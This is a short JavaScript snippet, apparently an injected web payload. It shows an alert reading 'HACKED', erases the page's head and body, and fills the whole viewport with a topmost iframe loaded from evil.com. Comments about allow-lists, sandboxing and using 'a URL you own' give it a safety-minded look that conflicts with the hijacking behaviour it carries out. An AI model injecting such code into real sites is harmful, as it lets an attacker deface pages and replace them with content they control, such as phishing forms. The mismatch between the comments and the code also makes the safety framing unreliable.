(function replacePageWithIframe(targetUrl = 'https://evil.com') {
  // Basic safety check: require an explicit origin you control (replace below)
  alert("HACKED")
  const allowed = ['https://evil.com', 'https://your-own-domain.example']; 
  const urlOrigin = (() => {
    try { return new URL(targetUrl).origin; } catch { return null; }
  })();
  if (!urlOrigin || !allowed.includes(urlOrigin)) {
    console.error('Target URL not in allowed list. Update allowed[] with a domain you own.');
    return;
  }

  // Remove existing content
  // Clear body and head contents to minimize leftovers
  document.head && (document.head.innerHTML = '');
  document.body && (document.body.innerHTML = '');

  // Create and style iframe to fill the viewport
  const iframe = document.createElement('iframe');
  iframe.src = targetUrl;
  iframe.style.position = 'fixed';
  iframe.style.top = '0';
  iframe.style.left = '0';
  iframe.style.width = '100vw';
  iframe.style.height = '100vh';
  iframe.style.border = '0';
  iframe.style.margin = '0';
  iframe.style.padding = '0';
  iframe.style.zIndex = '2147483647'; // keep it on top

  // Security-related attributes (tune as needed)
  // - sandbox: restricts what the framed content can do. Start strict; add permissions only if necessary.
  // - referrerPolicy: avoid sending the parent page URL.
  iframe.setAttribute('sandbox', 'allow-forms allow-scripts'); // consider removing allow-scripts if not needed
  iframe.setAttribute('referrerpolicy', 'no-referrer');

  // Append to the cleared body
  document.body.appendChild(iframe);

  // Optional: ensure the page has no scrollbars
  document.documentElement.style.overflow = 'hidden';
  document.body.style.overflow = 'hidden';
})('https://evil.com'); // CHANGE this to a URL you own/trust
